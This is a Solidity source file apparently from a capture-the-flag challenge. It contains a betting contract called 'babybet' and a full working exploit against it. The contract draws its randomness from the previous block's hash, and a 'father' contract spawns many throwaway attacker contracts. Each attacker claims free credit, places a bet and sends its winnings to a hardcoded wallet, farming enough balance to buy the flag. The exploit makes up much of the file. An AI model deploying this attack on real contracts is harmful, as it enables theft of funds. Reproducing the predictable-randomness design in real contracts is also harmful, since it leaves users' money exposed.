pragma solidity ^0.4.23;

contract babybet {
    mapping(address => uint) public balance;
    mapping(address => uint) public status;
    address owner;
    
    //Don't leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.
    //Gmail is ok. 163 and qq may have some problems.
    event sendflag(string md5ofteamtoken,string b64email); 
    
    constructor()public{
        owner = msg.sender;
        balance[msg.sender]=1000000;
    }
    
    //pay for flag
    function payforflag(string md5ofteamtoken,string b64email) public{
        require(balance[msg.sender] >= 1000000);
        if (msg.sender!=owner){
        balance[msg.sender]=0;}
        owner.transfer(address(this).balance);
        emit sendflag(md5ofteamtoken,b64email);
    }
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    //get_profit
    function profit(){
        require(status[msg.sender]==0);
        balance[msg.sender]+=10;
        status[msg.sender]=1;
    }
    
    //add money
    function () payable{
        balance[msg.sender]+=msg.value/1000000000000000000;
    }
    
    //bet
    function bet(uint num) {
        require(balance[msg.sender]>=10);
        require(status[msg.sender]<2);
        balance[msg.sender]-=10;
        uint256 seed = uint256(blockhash(block.number-1));
        uint rand = seed % 3;
        if (rand == num) {
            balance[msg.sender]+=1000;
        }
        status[msg.sender]=2;
    }
    
    //transfer
    function transferbalance(address to,uint amount){
        require(balance[msg.sender]>=amount);
        balance[msg.sender]-=amount;
        balance[to]+=amount;
    }
    
}

contract father {
    function father() payable {}
    babybet_attack son;
    function attack(uint256 times) public {
        for(uint i=0;i<times;i++){
            son = new babybet_attack();
        }
    }
    function () payable {
    }
}

contract babybet_attack{
    address bbb=0x5d7aacdf02186810d754cf24d2496b3bdf30d75b;
    address mywallet=0xdAA45B7958aF6B14dc8BFF097AddC449Bc39fB55;
    constructor() public{
        babybet(bbb).profit();
        babybet(bbb).bet(0);
        uint amount=babybet(bbb).balance(address(this));
        if (amount>500){
        babybet(bbb).transferbalance(mywallet,1000);}
    }
}